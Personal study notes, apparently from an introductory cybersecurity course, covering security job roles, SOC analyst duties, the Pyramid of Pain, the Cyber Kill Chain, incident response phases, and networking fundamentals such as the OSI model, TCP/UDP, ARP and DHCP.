# Jobs in Cyber



* Security Analyst
        * Working with various stakeholders to analyze the cyber security throughout the company
        * Compile ongoing reports about the safety of networks, documenting security issues and measures taken in response
        * Develop security plans, incorporating research on new attack tools and trends, and measures needed across teams to maintain data security.
* Security Engineer
    * Testing and screening security measures across software
    * Monitor networks and reports to update systems and mitigate vulnerabilities
    * Identify and implement systems needed for optimal security
* Incident responder
    * Developing and adopting a thorough, actionable incident response plan
    * Maintaining strong security best practices and supporting incident response measures
    * Post-incident reporting and preparation for future attacks, considering learnings and adaptations to take from incidents
* Digital Forensics Examiner
    * Collect digital evidence while observing legal procedures
    * Analyze digital evidence to find answers related to the case
    * Document your findings and report on the case
* Malware Analyst
    * Carry out static analysis of malicious programs, which entails reverse-engineering
    * Conduct dynamic analysis of malware samples by observing their activities in a controlled environment
    * Document and report all the findings
* Penetration Tester
    * Conduct tests on computer systems, networks, and web-based applications
    * Perform security assessments, and audits, and analyze policies
    * Evaluate and report on insights, recommending actions for attack prevention
* Red Teamer
    * Emulate the role of a threat actor to uncover exploitable vulnerabilities, maintain access and avoid detection
    * Assess organizations' security controls, threat intelligence, and incident response procedures
    * Evaluate and report on insights, with actionable data for companies to avoid real-world instances


# SOC Analyst Path



* Career as a junior (Associate) security analyst
    * Be a triage specialist
        * Monitor, investigate the alerts
        * Configure and manage the security tools
        * Develop and implement basic IDS (Intrusion detection system) signatures
        * Participate in SOC working groups and meetings
        * Create tickets and escalate the security incidents to the tier 2 and team lead if needed
    * Need to understand Networking
        * OSI model
        * TCP/IP model
        * Operating systems
        * Web applications
* Security Operations Center (SOC)
    * Investigate, monitor, prevent and respond to threats in the cyber realm
    * Preparation and prevention
        * Stay informed of the current cyber threats
            * Twitter and Feedly
        * Prevention methods
            * Gatering intelligence data on latest threats
            * TTPs (Tactics, Techniques, and Procedures)
            * Updating firewall signatures 
            * Patching vulnerabilities in existing systems
            * Block-listing and safe-listing applications, email addresses, and IPs
    * Monitoring and Investigation
        * SIEM (Security Information and Event Management)
        * EDR (Endpoint Detection and Response)
        * Priortize the alerts based on their level
            * Low
            * Medium
            * High
            * Critical
* Day in the life of a junior security analyst
    * Monitor network traffic
        * IPS (intrusion prevention system) and IDS (Intrusion detection system) alerts
        * Suspicious emails
        * Extract forensics data to analyze and detect potential attacks
        * Use open-source intelligence to help you make the appropriate decisions on the alerts
    * Incident response
        * Might take hours, days, weeks
* Pyramid of pain
    * Hash Values (Trivial)
        * <span style="text-decoration:underline;">A hash value is not cryptographically secure if two files have the same hash value</span>
        * Very easy to spot a malicious file if we have the hash in our knowledge
        * Simple addition of any info to file <span style="text-decoration:underline;">changes hash value</span>
    * IP addresses (Easy)
        * Fast flux
            * **DNS technique used by botnets the hide phishing, web proxying, malware delivery, and malware communication behind compromised hosts acting as proxies**
            * Purpose to make communication <span style="text-decoration:underline;">betweel malware and its command and control (C&C) challenging</span> to be discovered by security professionals
    * Domain Names (Simple)
        * Pain for the attackers to change
            * Purchase the domain, register it, modify DNS records
        * Can detect malicious domains with proxy logs or we server logs
        * <span style="text-decoration:underline;">Punycode attack</span>
            * Punycode
                * **Way of converting words that cannot be written in ASCII, into a Unicode ASCII encoding**
                * <span style="text-decoration:underline;">Url showing adidas.de can actually be xn–addas-o4a.de</span>
        * URL Shorteners
            * <span style="text-decoration:underline;">Creates short and unique URL</span> that will redirect to the specific website specified during the initial step of setting up the URL shortener link
                * Bit.ly
                * Goo.gl
                * Ow.ly
                * S.id
                * Smarturl.it
                * Tiny.pl
                * Tinyurl.com
                * x.co
    * Network/ Host Artifacts (Annoying)
        * Attacker would need to <span style="text-decoration:underline;">circle back at this detection level and change his attack tools and methodologies</span>
        * Host artifacts
            * **Traces or observables that attackers leave on the system**
                * Registry values
                * Suspicious process execution
                * Attack patterns 
                * IOCs (Indicators of Compromise)
                * Files dropped by malicious applications, or anything exclusive to the current threat
        * Network artifacts
            * If you can detect and respond to the threat, the attacker would need more time to go back and change his tactics or modify the tools
                * Gives you more time to respond and detect the upcoming threats or remediate the existing ones
            * Artifiacts
                * <span style="text-decoration:underline;">User-agent string</span>
                    * Hasn’t been observed in your environment before or seems out of the ordinary
                    * **Defined by RFC2616 as the request-header field that contains the information about the user agent originating the request**
                    * Could block user-agent
                * C2 (Command & control) information
                * URI patterns followed by HTTP POST requests
    * Tools (Challenging)
        * Attackers use utilities to create malicious macro documents (Maldocs) for spearphishing attempts
            * Backdoor that can establish C2 (Command and Control infrastructure), any custom .EXE, and .DLL files, payloads, or password crackers
        * <span style="text-decoration:underline;">Antivirus signatures, detection rules, and YARA rules can be extremely useful</span>
        * MalwareBazaar and Malshare are good to provide with access to samples, malicious feeds, and YARA results
        * **Fuzzy hashing (Context triggered piecewise hashes)**
            * <span style="text-decoration:underline;">Helps you perform similarity analysis </span>- Match two files with minor differences based on the fuzzy hash values
            * SSDeep hashing value
    * TTPs (Tough)
        * **Tactics, techniques and procedures**
        * Includes the <span style="text-decoration:underline;">whole MITRE ATT&CK Matrix</span>
            * All <span style="text-decoration:underline;">steps taken by an adversary</span> to achieve his goal. Starting from phishing attempts to persistence and data exfiltration
        * If you can respond to the TTPs quickly, you leave the adversaries almost no chance to fight back
            * If you can detect a Pass-The-Hash attack, you can find the compromised host quickly
* Cyber Kill chain
    * Kill chain
        * Military concept related to the structure of an attack
    * Reconnaissance
        * **Discovering and collecting information on the system and the victim**
        * Planning phase
        * OSINT (Open Source Intelligence)
            * First step attacker needs to complete other phases of task
            * Study the victim by collecting every available piece of information on the company and its employees from <span style="text-decoration:underline;">PUBLICLY AVAILABLE</span> resources
                * Company size
                * Email addresses
                * Phone numbers
            * Email harvesting
                * **Obtaining email addresses from public, paid, or free services**
                * Tools
                    * theHarvester
                        * Gather emails, names, subdomains, IPs, and URLs using multiple public data sources
                    * Hunter.io
                        * Email hunting tool that will obtain contact information associated with the domain
                    * OSINT Framework
                        * Provides collection of OSINT tools based on various categories
    * Weaponization
        * **Contains malware and exploit into a deliverable payload**
        * Most attackers usually use <span style="text-decoration:underline;">automated tools to generate the malware or refer to the Darkweb</span> to purchase the malware
        * Malware
            * **Program or software that is designed to damage, disrupt, or gain unauthroized access to a computer**
        * Exploit
            * **Program or a code that take advantage of the vulnerability or flaw in the application or system**
        * Payload
            * **Malicious code that the attacker runs of the system**
        * Examples
            * Create infected Microsoft Office document containing a malicious macro or VBA (Visual basic for Applications) scripts
            * Create a malicious payload or very sophisticated worm, implant it on the USB drives and distribute them in public
            * Choose command and control techniques for executing the commands on the victim’s machine or deliver more payloads
            * Attacker would select a backdoor implant
    * Delivery
        * Method of transmitting the payload or the malware
        * Phishing email
            * Craft malicious email that would target e<span style="text-decoration:underline;">ither a specific person (spearfishing) or multiple people</span> in the company
            * Email contains a <span style="text-decoration:underline;">payload or malware</span>
        * Distributing infected USB drives in public places
            * Could print companies logo on the USB drive and mail them to the company while <span style="text-decoration:underline;">pretending to be customer service</span> sending the USB devices as a gift
        * Watering hole attack
            * **A targeted attack designed to aim at a specific group of people by compromising the website they are usually visiting and then redirecting them to the malicious website of an attacker’s choice**
            * The attacker would look for a <span style="text-decoration:underline;">known vulnerability in the website</span> and try to exploit it
            * The attacker would encourage victims to visit the website by <span style="text-decoration:underline;">sending “harmless” emails pointing out the malicious URL</span> to make the attack more efficient
            * After visiting the website, victims would <span style="text-decoration:underline;">unintentionally download malware or a malicious application</span> to their computer
                * <span style="text-decoration:underline;">Drive-by download</span>
    * Exploitation
        * Vulnerability needs to be exploited
        * After gaining access to the system, a malicious actor could exploit software, system, or server-based vulnerabilities to escalate the privileges or move laterally through the network
        * Lateral movement
            * Techniques that a malicious actor uses after gaining initial access to the victim’s machine to move deeper into a network to obtain sensitive data
        * Zero-day exploit
            * Leaves NO opportunity for detection at the beginning
    * Installation
        * The attacker needs to install a persistent backdoor
        * Persistence can be achieved by 
            * Installing a web shell on the webserver
                * Malicious script is written in languages such as ASP, PHP, or JSP
                * Can be difficult to detect due to file formatting (.php, .asp, .aspx, .jsp, etc.) 
            * Installing a backdoor on the victim’s machine
                * Could use meterpreter to install a backdoor
                    * Interactive shell hosted on victim’s machine
            * Creating or modifying Windows Services
                * An attacker can create or modify the WIndows services to execute the malicious scripts or payloads regularly as a part of persistence
                * Can use tools like sc.exe (create, start, stop, query, or delta any window’s service) and Reg
                * Can also masquerade malicious payload by using a service name that is regularly known to the operating system
            * Adding the entry to the “run keys” for the malicious payload in the registry or startup folder
                * Payload will execute each time the user logs in on the computer
                * There is a startup folder location for individual accounts and a system-wide startup folder that will be checked no matter what user account logs in
        * Timestomping
            * Avoid detection and make the malware appear as a part of a legitimate program
            * Lets attacker modify the file’s timestamps and modify, access, create, and change times
    * Command & Control
        * C&C or C2 Beaconing
            * Malicious communication between a C&C server and malware on the infected host
            * Infected host will consistently communicate with the C2 server
        * Compromised endpoint would communicate with an external server set up by an attacker to establish a command & control channel
        * After connection is established, the attacker has full control of the victim’s machine
        * IRC (internet relay chat) was commonly used by attackers
            * Modern security can easily detect malicious IRC traffic
        * The most common C2 channels now
            * HTTP on port 80 and HTTPS on port 443
                * Blends malicious traffic with the legitimate traffic and can help the attacker evade firewalls
            * DNS 
                * Infected machine makes constant DNS requests to the DNS server that belongs to an attacker, this type of C2 communication is also known as <span style="text-decoration:underline;">DNS tunneling</span>
    * Actions on Objectives
        * Collect credentials from users
        * Perform privilege escalation
            * Gaining elevated access like domain administrator access from a workstation by exploiting misconfiguration
        * Internal reconnaissance
            * Attacker gets to interact with internal software to find its vulnerabilities
        * Lateral movement through the company’s environment
        * Collect and exfiltrate sensitive data
        * Deleting the backups and shadow copies
            * Shadow copy is a Microsoft technology that can create backup copies, snapshots of computer files, or volumes
        * Overwrite or corrupt data


# Introduction to Defensive Security


## Intro to defensive security



* Concerned with two main tasks
    * Preventing intrusions from occurring
    * Detecting intrusions when they occur and responding quickly
* Some tasks related to defensive security include
    * User cyber security awareness: Training users about cyber security helps protect against various attacks that target their systems.
    * Documenting and managing assets: We need to know the types of systems and devices that we have to manage and protect properly.
    * Updating and patching systems: Ensuring that computers, servers, and network devices are correctly updated and patched against any known vulnerability (weakness).
    * Setting up preventative security devices: firewall and intrusion prevention systems (IPS) are critical components of preventative security. Firewalls control what network traffic can go inside and what can leave the system or network. IPS blocks any network traffic that matches present rules and attack signatures.
    * Setting up logging and monitoring devices: Without proper logging and monitoring of the network, it won’t be possible to detect malicious activities and intrusions. If a new unauthorized device appears on our network, we should be able to know.


## Areas of defensive security



* Security Operations center (SOC)
    * Main interests of the SOC
    * Vulnerabilities
        * Whenever a system vulnerability is discovered, it is essential to fix it by installing a proper patch or update. If a fix is not available, necessary measures should be taken to prevent an attacker from exploiting it
    * Policy violations
        * Set of rules required for the protection of the network and systems
    * Unauthorized activity
        * Consider a user’s login is has been stolen, SOC must detect the unauthorized access to the network
    * Network Intrusions
        * When an intrusion occurs, we must detect it as soon as possible to prevent further damage
* Threat Intelligence
    * Aims to gather information to help the company better prepare against potential adversaries
    * Purpose is to achieve a _<span style="text-decoration:underline;">Threat-informed defense</span>_
    * Data has to be collected, processed, and analyzed
    * As a result of threat intelligence
        * Know their tactics, techniques and procedures
* Digital Forensics and Incident Response (DFIR)
    * Digital Forensics 
        * Application of science to investigate crimes and establish facts
        * The focus of digital forensics shifts to analyzing evidence of an attack and its perpetrators and other areas such as intellectual property theft, cyber espionage, and possession of unauthorized content
        * Focuses on different areas as
            * File system
                * Analyzing a digital forensics image (low-level copy) of a system’s storage reveals much information, such as installed programs, created files, partially overwritten files, and deleted files.
            * System memory
                * If the attacker is running their malicious program in memory without saving it to the disk, taking a forensic image (Low-level) copy of the system memory is the best way to analyze its contents and learn about the attack
            * System logs
                * Each client and server computer maintains different log files about what is happening. Log files provide plenty of information about what happened on a system. Some traces will be left even if the attacker tries to clear their traces
            * Network logs
                * Logs of the network packets that have traversed a network would help answer more questions about whether an attack is occurring and what it entails
    * Incident Response
        * _Incident_ refers to a data breach or cyber attack; however, in some cases, it can be something less critical, such as a
            * Misconfiguration
            * Intrusion attempt
            * Policy violation
        * Examples
            * Attacker making our network or systems inaccessible
            * Defacing the public website
            * Data breach
        * 4 major phases of the incident response process
            * 1. Preparation
                * Requires a team trained and ready to handle incidents
                * Ideally, various measure are put in place to prevent incidents from happening in the first place
            * 2. Detection and analysis
                * Team has the necessary resources to detect any incident; moreover, it is essential to further analyze any detected incident to learn about its severity
            * 3. Containment, Eradication, and Recovery
                * Once an incident is detected, it is crucial to stop it from affecting other systems, eliminate it, and recover the affected systems
            * 4. Post-Incident Activity
                * After a successful recovery, a report is produced, and the learned lesson is shared to prevent similar future incidents.
            * 

<p id="gdcalert1" ><span style="color: red; font-weight: bold">>>>>>  gd2md-html alert: inline image link here (to images/image1.png). Store image on your image server and adjust path/filename/extension if necessary. </span><br>(<a href="#">Back to top</a>)(<a href="#gdcalert2">Next alert</a>)<br><span style="color: red; font-weight: bold">>>>>> </span></p>


![alt_text](images/image1.png "image_tooltip")

    * Malware Analysis
        * Malware = Malicious Software
        * Virus
            * Piece of code (Part of a program) that attaches itself to a program.
            * Designed to spread from one computer to another
            * Works by altering, overwriting, and deleting files once it infects a computer
            * Results in computer being slow or unusable
        * Trojan Horse
            * Program shows one desirable function but hides a malicious function underneath
        * Ransomware
            * Malicious program that encrypts the user’s files
            * Encryption makes the files unreadable without knowing the encryption password
            * Usually have to pay a ransom 
        * Learning/ Analyzing
            * Static analysis
                * Inspecting the malicious program without running it
                * Usually requires solid knowledge of assembly language
            * Dynamic analysis
                * Running the malware in a controlled environment and monitoring its activities
                * Lets you observe how the malware behaves when running


# Networking Fundamentals



* What is networking
    * Networks are simply things connected
* What is the internet?
    * First iteration of the internet was within the ARPANET project in the late 1960’s 
    * Funded by the U.S. Defence Department
    * Wasn't until 1989 when the internet as we know it was invented by **Tim Berners-Lee** by the creation of the **World Wide Web (WWW)**
* Identifying Devices on a network
    * Devices have 2 means of identification. 
        * IP address
        * Media Access Control (MAC) address
            * Similar to a serial number
    * IP Addresses
        * Internet Protocol
        * Set of numbers divided into 4 octets
        * Cannot be more than one simultaneously in a network
        * Follow set of standards known as protocols
        * Protocols are the backbone of networking and force many devices to communicate in the same language
        * 

<p id="gdcalert2" ><span style="color: red; font-weight: bold">>>>>>  gd2md-html alert: inline image link here (to images/image2.png). Store image on your image server and adjust path/filename/extension if necessary. </span><br>(<a href="#">Back to top</a>)(<a href="#gdcalert3">Next alert</a>)<br><span style="color: red; font-weight: bold">>>>>> </span></p>


![alt_text](images/image2.png "image_tooltip")

        * Online devices usually have 2 IP addresses
            * Public IP
                * Any data sent to the internet from **ANY device will be identified by the same public IP address**
                * Given by your Internet Service Provider (ISP)
            * Private IP
                * Use for devices to communicate with each other locally
        * IPv4 vs IPv6
            * IPv4 supports 4.29 billion addresses
            * IPv6 supports more than 340 trillion
            * 

<p id="gdcalert3" ><span style="color: red; font-weight: bold">>>>>>  gd2md-html alert: inline image link here (to images/image3.png). Store image on your image server and adjust path/filename/extension if necessary. </span><br>(<a href="#">Back to top</a>)(<a href="#gdcalert4">Next alert</a>)<br><span style="color: red; font-weight: bold">>>>>> </span></p>


![alt_text](images/image3.png "image_tooltip")

    * MAC Addresses
        * Devices on a network will have a <span style="text-decoration:underline;">physical network interface,</span> which is a microchip board found on the device’s motherboard
        * This network interface is assigned a unique address at the factory it was built at called a **_MAC (Media Access Control) address_**
        * MAC Address is a 12-character hexadecimal number split into 2’s and separated by a colon
            * Ex: <code><em>a4:c3:f0:85:ac:2d</em></code>
            * 

<p id="gdcalert4" ><span style="color: red; font-weight: bold">>>>>>  gd2md-html alert: inline image link here (to images/image4.png). Store image on your image server and adjust path/filename/extension if necessary. </span><br>(<a href="#">Back to top</a>)(<a href="#gdcalert5">Next alert</a>)<br><span style="color: red; font-weight: bold">>>>>> </span></p>


![alt_text](images/image4.png "image_tooltip")

        * MAC Addresses can be <strong>Spoofed</strong>
            * It can often break poorly implemented security designs that assume that devices talked on a network are trustworthy
    * Ping (ICMP)
        * ICMP (Internet Control Message Protocol)
        * Determines the performance of a connection between devices
            * Stable
            * Exists
        * Ping - Time taken for ICMP packets to travel between devices
        * Usage - <em>ping &lt;IP Address or URL></em>
* Local Area Network (LAN) Topologies
    * Star Topology
        * Devices are individually connected via a central networking device such as a switch or a hub
        * Most common today because of its reliability and scalability - Despite the cost
        * Any information sent to a device is <span style="text-decoration:underline;">sent via the central device</span> to which it connects
        * Advantages
            * More scalable in nature
        * Disadvantages
            * <strong><span style="text-decoration:underline;">More expensive</span> than any other topology</strong>
            * <span style="text-decoration:underline;">More maintenance</span> required
            * Increased dependence on maintenance can make troubleshooting faults much harder
            * <span style="text-decoration:underline;">Has a single point of failure</span> - The centralized hardware (switch or hub)
        * 

<p id="gdcalert5" ><span style="color: red; font-weight: bold">>>>>>  gd2md-html alert: inline image link here (to images/image5.png). Store image on your image server and adjust path/filename/extension if necessary. </span><br>(<a href="#">Back to top</a>)(<a href="#gdcalert6">Next alert</a>)<br><span style="color: red; font-weight: bold">>>>>> </span></p>


![alt_text](images/image5.png "image_tooltip")

    * Bus Topology
        * <strong>Relies upon a single connection which is known as a <span style="text-decoration:underline;">backbone cable</span></strong>
        * Similar to the leaf off of a tree that the devices (leaves) stem from where the branches are on this cable
        * It is very prone to becoming <span style="text-decoration:underline;">slow and bottlenecked</span> if devices within the topology are simultaneously requesting data
        * <span style="text-decoration:underline;">Difficult to troubleshoot</span> due to difficulties identifying which device is experiencing issues with data all traveling along the same route
        * <span style="text-decoration:underline;">Little redundancy</span> in case of failures
        * <span style="text-decoration:underline;">Single point of failure</span> along the backbone cable
            * If cable breaks,devices can no longer receive or transmit data
        * 

<p id="gdcalert6" ><span style="color: red; font-weight: bold">>>>>>  gd2md-html alert: inline image link here (to images/image6.png). Store image on your image server and adjust path/filename/extension if necessary. </span><br>(<a href="#">Back to top</a>)(<a href="#gdcalert7">Next alert</a>)<br><span style="color: red; font-weight: bold">>>>>> </span></p>


![alt_text](images/image6.png "image_tooltip")

    * Ring Topology (Token Topology)
        * <strong>Devices are connected directly to each other to form a loop</strong>
        * Little cabling required and less dependence on dedicated hardware such as within a <span style="text-decoration:underline;">star topology</span>
        * Works by sending data across the loop until it <span style="text-decoration:underline;">reaches the destined device</span>, using other devices along the loop to forward the data
        * Device will <span style="text-decoration:underline;">only send received data</span> from another device in the topology if it does not have any to send itself
            * Will prioritize its own data first, then send data from another device
        * The single direction for traveling data makes it fairly easy to <span style="text-decoration:underline;">troubleshoot </span>any faults
        * <span style="text-decoration:underline;">Not efficient</span>
        * Less prone to bottlenecks than Bus Topology
        * Single point of failure, such as a cut cable results in breaking the entire network
        * 

<p id="gdcalert7" ><span style="color: red; font-weight: bold">>>>>>  gd2md-html alert: inline image link here (to images/image7.png). Store image on your image server and adjust path/filename/extension if necessary. </span><br>(<a href="#">Back to top</a>)(<a href="#gdcalert8">Next alert</a>)<br><span style="color: red; font-weight: bold">>>>>> </span></p>


![alt_text](images/image7.png "image_tooltip")

* What is a switch?
    * <strong>Dedicated devices within a network to aggregate multiple other devices using ethernet</strong>
    * Switches and routers can be connected to each other
        * Increases the redundancy of a network by adding <span style="text-decoration:underline;">multiple paths for data to take</span>
        * <span style="text-decoration:underline;">If one path goes down, another can be used</span>
        * May reduce overall performance due to longer travel time
            * <span style="text-decoration:underline;">No downtime</span>
    * 

<p id="gdcalert8" ><span style="color: red; font-weight: bold">>>>>>  gd2md-html alert: inline image link here (to images/image8.png). Store image on your image server and adjust path/filename/extension if necessary. </span><br>(<a href="#">Back to top</a>)(<a href="#gdcalert9">Next alert</a>)<br><span style="color: red; font-weight: bold">>>>>> </span></p>


![alt_text](images/image8.png "image_tooltip")

* What is a router?
    * <strong>Connect networks and pass data between them</strong>
    * Does this by <span style="text-decoration:underline;">routing</span>
    * Routing is the label given to the process of data traveling across networks
    * Routing involves creating a path between networks so that the data can be delivered
    * 

<p id="gdcalert9" ><span style="color: red; font-weight: bold">>>>>>  gd2md-html alert: inline image link here (to images/image9.png). Store image on your image server and adjust path/filename/extension if necessary. </span><br>(<a href="#">Back to top</a>)(<a href="#gdcalert10">Next alert</a>)<br><span style="color: red; font-weight: bold">>>>>> </span></p>


![alt_text](images/image9.png "image_tooltip")

* Subnetting
    * <strong>Splitting up a network into smaller, miniature networks within itself</strong>
    * <span style="text-decoration:underline;">Subnet mask - splitting up the number of hosts that can fit within the network</span>
    * 4 bytes (32 bits) ranging from 0-255
    * Subnets use IP Addresses in 3 ways
        * Identify the network address
        * Identify the host address
        * Identify the default gateway
    * 

<p id="gdcalert10" ><span style="color: red; font-weight: bold">>>>>>  gd2md-html alert: inline image link here (to images/image10.png). Store image on your image server and adjust path/filename/extension if necessary. </span><br>(<a href="#">Back to top</a>)(<a href="#gdcalert11">Next alert</a>)<br><span style="color: red; font-weight: bold">>>>>> </span></p>


![alt_text](images/image10.png "image_tooltip")

* ARP Protocol
    * <strong>Address Resolution Protocol</strong>
        * Responsible for allowing devices to identify themselves on a network
        * <span style="text-decoration:underline;">Allows device to associate its MAC address with an IP address on the network</span>
        * When devices wish to communicate with another, they will send a broadcast to the entire network searching for the specific device.
        * Devices can use the <span style="text-decoration:underline;">ARP protocol to find the MAC address</span> (Therefore the physical identifier) of a device for communication
    * How does it work?
        * Each device has a cache to store information on
            * Stores identifiers of other devices on the network
        * ARP Protocol sends two types of messages
            * ARP Request
                * Message is <span style="text-decoration:underline;">broadcasted to every other device</span> found on a network by the device, asking whether or not the <span style="text-decoration:underline;">device’s MAC Address matches the requested IP Address</span>
            * ARP Reply
                * If the device does have the requested IP Address, an<span style="text-decoration:underline;"> ARP Reply</span> is returned to the initial device to acknowledge this
                * The initial device now <span style="text-decoration:underline;">remembers this</span> and stores it within its cache<span style="text-decoration:underline;"> (ARP entry)</span>
            * 

<p id="gdcalert11" ><span style="color: red; font-weight: bold">>>>>>  gd2md-html alert: inline image link here (to images/image11.png). Store image on your image server and adjust path/filename/extension if necessary. </span><br>(<a href="#">Back to top</a>)(<a href="#gdcalert12">Next alert</a>)<br><span style="color: red; font-weight: bold">>>>>> </span></p>


![alt_text](images/image11.png "image_tooltip")

* DHCP Protocol
    * <strong>Dynamic Host Configuration Protocol</strong>
    * When a device connects to a network, if it has not already been manually assigned an IP address,<span style="text-decoration:underline;"> it sends out a request (DHCP Discover) </span>to see if any DHCP servers are on the network
    * <span style="text-decoration:underline;">DHCP server replies</span> with and IP address the device could use <span style="text-decoration:underline;">(DHCP Offer)</span>
    * <span style="text-decoration:underline;">Device send a reply confirming</span> it wants the offered IP address <span style="text-decoration:underline;">(DHCP Request)</span>
    * <span style="text-decoration:underline;">DHCP server sends a reply acknowledging</span> this has been completed
    * Device starts using the IP address <span style="text-decoration:underline;">(DHCP ACK)</span>


## OSI Model



* **Open Systems Interconnection Model**
    * **Encapsulation**
        * Specific process take place at every individual layer that data travels through, and pieces of information are added to this data
    * 7. Application
        * Layer in which <span style="text-decoration:underline;">protocols and rules are in place to determine how the user should interact</span> with data sent or received
        * Graphical User Interface (GUI)
            * Users to interact with data sent or received
        * Domain Naming System (DNS)
            * Website addresses are translated into IP Addresses
    * 6. Presentation
        * <span style="text-decoration:underline;">Layer in which standardization starts to take place</span>
        * Acts as a<span style="text-decoration:underline;"> translator for data to and from the application</span> layer
        * Receiving computer will also understand data sent to a computer in one format destined for in another format
        * <span style="text-decoration:underline;">Security features such as data encryption (Like HTTPS) occur here</span>
    * 5. Session
        * Once<span style="text-decoration:underline;"> translated or formatted, the session layer will begin to create a connection to the other computer</span> that the data is destined for
        * <span style="text-decoration:underline;">Synchronizes the 2 computers</span> to ensure they are on the same page before data is sent and received
        * Once checks are in place, session layer will begin to divide the data sent into smaller chunks of data and begin to send them one at a time <span style="text-decoration:underline;">(Packets)</span>
        * <span style="text-decoration:underline;">If the connection is lost, only chunks that weren’t yet sent will have to be sent again</span>
        * Sessions are <span style="text-decoration:underline;">UNIQUE</span> 
            * Data cannot travel over different sessions
            * Only across each session instead
    * 4. Transport
        * <span style="text-decoration:underline;">When data is sent between devices, 2 different protocols are used</span>
            * TCP
                * **Transmission Control Protocol**
                * Designed with reliability and guarantee in mind
                * <span style="text-decoration:underline;">Reserves a constant connection between 2 devices for time for data to be sent and received</span>
                * Advantages
                    * <span style="text-decoration:underline;">Guarantees accuracy of data</span>
                    * Synchronizing 2 devices to prevent each other from being flooded with data
                    * Performs a lot more processes for reliability
                * Disadvantages
                    * <span style="text-decoration:underline;">Requries reliable connection between 2 devices</span>
                    * If one small chunk of data is not received, then the <span style="text-decoration:underline;">entire chunk of data cannot be used</span>
                    * Slow connection can bottleneck another device as connection will be reserved on the receiving computer the whole time
                    * <span style="text-decoration:underline;">TCP significantly slower than UDP</span>
            * UDP
                * **User Datagram Protocol**
                * Does not have error checking
                * <span style="text-decoration:underline;">No synchronization between 2 devices or guarantee</span>
                * Advantages
                    * <span style="text-decoration:underline;">Must faster than TCP</span>
                    * Leaves the Application layer (user software) to decide if there is any control over how quickly packets are sent
                    * Does not reserve continuous connection 
                * Disadvantages
                    * <span style="text-decoration:underline;">Does not care if data is received</span>
                    * Quite flexible to software developers
                    * Unstable connections result in terrible experience for user
                * Useful in situations where small pieces of data are sent
                * Example
                    * Protocols used for discovering devices (ARP and DHCP)
                    * Larger files such as video stream
                        * Some of the video is pixelated 
                        * Pixels are just lost pieces of data
    * 3. Network
        * <span style="text-decoration:underline;">Routing and reassembly of data take place</span>
        * **RIP (Routing Information Protocol)**
        * **OSPF (Open Shortest Path First)**
            * What path is shortest?
                * Which path has the least amount of devices that the packet needs to travel across
            * What path is most reliable?
                * Have packets been lost on that path before?
            * Which path has the faster physical connection?
                * Is one using a faster medium? Fiber or Copper?
        * <span style="text-decoration:underline;">IP Addresses are dealt with at this layer</span>
        * Layer 3 devices
            * Routers
    * 2. Data Link
        * Focuses on physical addressing of the transmission
        * It receives a packet from the network layer and adds in the physical MAC address of the receiving endpoint
        * All network-enabled computers have a Network Interface Card (NIC)
            * Comes with a unique MAC address to identify it
        * When information is sent across a network, it’s the physical address that is used to identify where exactly to send the information
        * Its the job of the data link layer to present the data in a format suitable for transmission
    * 1. Physical
        * <span style="text-decoration:underline;">Physical components of the hardware used in networking</span>
        * Devices use electrical signals to transfer data between each other in binary (0’s and 1’s)
        * Ethernet cables


# Packets & Frames



* <span style="text-decoration:underline;">Frame - no information such as IP addresses or other encapsulating information</span>
* <span style="text-decoration:underline;">Packet Headers</span>
    * 

<p id="gdcalert12" ><span style="color: red; font-weight: bold">>>>>>  gd2md-html alert: inline image link here (to images/image12.png). Store image on your image server and adjust path/filename/extension if necessary. </span><br>(<a href="#">Back to top</a>)(<a href="#gdcalert13">Next alert</a>)<br><span style="color: red; font-weight: bold">>>>>> </span></p>


![alt_text](images/image12.png "image_tooltip")

* TCP/IP (Three-way handshake)
    * <span style="text-decoration:underline;">TCP guarantees that any data sent will be received on the other end</span>
    * TCP Packet Headers
    * 

<p id="gdcalert13" ><span style="color: red; font-weight: bold">>>>>>  gd2md-html alert: inline image link here (to images/image13.png). Store image on your image server and adjust path/filename/extension if necessary. </span><br>(<a href="#">Back to top</a>)(<a href="#gdcalert14">Next alert</a>)<br><span style="color: red; font-weight: bold">>>>>> </span></p>


![alt_text](images/image13.png "image_tooltip")

    * <span style="text-decoration:underline;">Steps of 3 way handshake</span>
    * 

<p id="gdcalert14" ><span style="color: red; font-weight: bold">>>>>>  gd2md-html alert: inline image link here (to images/image14.png). Store image on your image server and adjust path/filename/extension if necessary. </span><br>(<a href="#">Back to top</a>)(<a href="#gdcalert15">Next alert</a>)<br><span style="color: red; font-weight: bold">>>>>> </span></p>


![alt_text](images/image14.png "image_tooltip")

    * To initiate closure of a TCP connection device will send a “FIN” packet to the other device
        * another device will have to acknowledge this packet
* UDP/IP
    * **UDP is a <span style="text-decoration:underline;">Stateless</span> protocol**
        * Does not require a constant connection between the two devices for data to be sent
        * No acknowledge is sent by the receiving device
    * **UDP Packet headers**
    * 

<p id="gdcalert15" ><span style="color: red; font-weight: bold">>>>>>  gd2md-html alert: inline image link here (to images/image15.png). Store image on your image server and adjust path/filename/extension if necessary. </span><br>(<a href="#">Back to top</a>)(<a href="#gdcalert16">Next alert</a>)<br><span style="color: red; font-weight: bold">>>>>> </span></p>


![alt_text](images/image15.png "image_tooltip")

* Ports 101
    * **Ports are a numerical value between 0 - 65535**
    * One common rule
        * Data is sent over port 80
    * <span style="text-decoration:underline;">Any port within 0 - 1024 is a “common port”</span>
        * FTP - 21
        * SSH - 22
        * HTTP - 80
        * HTTPS - 443
        * SMB - 445
        * RDP - 3389


# Extending your network



* Port forwarding
    * Without port forwarding, applications and services such as webservers are only available to devices within the same direct network
* Firewalls 101
    * Device within network responsible for determining wehat traffic is allowed to enter and exit
        * “Border security for a network”
    * An admin can configure a firewall to <span style="text-decoration:underline;">permit or deny</span> traffic fro mentoring or exiting a network based on numerous factors such as
        * Where is the traffic coming from?
        * Where is the traffic going to?
        * What port is the traffic for?
        * What protocol is the traffic using?
    * 2 primary categories of firewalls
        * Stateful
            * Uses the entire information from a connection
            * Rather than inspecting an individual packet, this firewall determines the behavior of a device <span style="text-decoration:underline;">Based upon the entire connection</span>
            * This type consumes <span style="text-decoration:underline;">many resources</span> in comparison to stateless firewalls as the <span style="text-decoration:underline;">decision making is dynamic</span>
            * If a connection from a host is bad, it will block the entire device
        * Stateless
            * Uses a static set of rules to determine whether or not <span style="text-decoration:underline;">individual packets</span> are acceptable or not
            * A device sending a bad packet will not necessarily mean that the entire device is then blocked
            * Use<span style="text-decoration:underline;"> fewer resources</span> than alternatives, but are much dumber
            * Only as <span style="text-decoration:underline;">effective as the rules</span> that are defined within them 
